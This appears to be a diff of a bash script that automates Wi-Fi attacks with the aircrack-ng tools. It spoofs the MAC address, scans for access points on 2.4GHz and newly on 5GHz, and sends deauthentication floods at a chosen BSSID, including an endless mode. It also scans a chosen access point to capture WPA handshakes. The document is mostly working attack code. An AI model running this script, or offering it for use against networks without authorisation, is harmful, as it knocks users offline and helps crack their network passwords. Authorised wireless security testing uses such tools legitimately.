@@ -70,23 +70,36 @@ clear
 wlan0=$(ip a | grep mon | head -1 | cut -d ":" -f 2)
 sudo ip link set $wlan0 down && sudo macchanger -A $wlan0 && sudo ip link set $wlan0 up 2>&1> /dev/null
 clear
-exec xterm -e sudo airodump-ng $wlan0 &
+exec xterm -e sudo airodump-ng -b abg $wlan0 &
+echo -e "\e[92mWorks with both 2.4GHz & 5GHz!\e[00m"
 echo "What channel to use for the attack?"
 read CH
+if [[ $CH -lt 14 ]]; then
+frequency=bg
+else frequency=a
+fi
 kill $!
-exec xterm -hold -e sudo airodump-ng -c $CH $wlan0 &
+exec xterm -hold -e sudo airodump-ng -b $frequency -c $CH $wlan0 &
 PID=$!
 echo -e "Input info from the new terminal that executed:"
 echo -e "Use spacebar to pause and copy info"
 read -p "BSSID:? " BSSID
 read -p "Deauth Count:? " COUNT
 kill $PID
-if [[ $COUNT = 0 ]]; then echo "0 count equates to infinite deauth, press Ctrl-c to cancel"; sleep 3
-exec xterm -e sudo aireplay-ng --deauth $COUNT -a $BSSID $wlan0 &
+if [[ $frequency = bg ]]; then
+#if [[ $COUNT = 0 ]]; then echo "0 count equates to infinite deauth, press Ctrl-c to cancel"; sleep 3
+sudo aireplay-ng --deauth $COUNT -a $BSSID $wlan0 
 else
-sudo aireplay-ng --deauth $COUNT -a $BSSID $wlan0
+sudo aireplay-ng -D --deauth $COUNT -a $BSSID $wlan0
 fi
-
+#fi
+#if [[ $frequency = a ]]; then
+#if [[ $COUNT = 0 ]]; then echo "0 count equates to infinite deauth, press Ctrl-c to cancel"; sleep 3
+#exec xterm -e sudo aireplay-ng -D --deauth $COUNT -a $BSSID $wlan0 &
+#else
+#sudo aireplay-ng -D --deauth $COUNT -a $BSSID $wlan0
+#fi
+#fi
 sudo airmon-ng stop $wlan0
 sudo ip link set $wifi down && sudo ip link set $wifi up
 }
@@ -185,7 +198,7 @@ kill $!
 clear
 echo -e "Gather info about the AP on channel $CH"
 echo -e "Close/spacebar xterm to copy info, xterm will not close!"
-echo -e "Xterm will close after Handshake Name has been inputted"
+echo -e "Xterm will close after Handshake Name has been defined."
 read -p "press ENTER"
 exec xterm -hold -e airodump-ng -c $CH $wlan0 &
 PID=$!
@@ -233,7 +246,7 @@ kill $!
 clear
 echo -e "Gather info about the AP on channel $CH"
 echo -e "Close/spacebar xterm to copy info, xterm will not close!"
-echo -e "Xterm will close after Handshake Name has been inputted"
+echo -e "Xterm will close after Handshake Name has been defined."
 read -p "press ENTER"
 exec xterm -hold -e airodump-ng -b a -c $CH $wlan0 &
 PID=$!
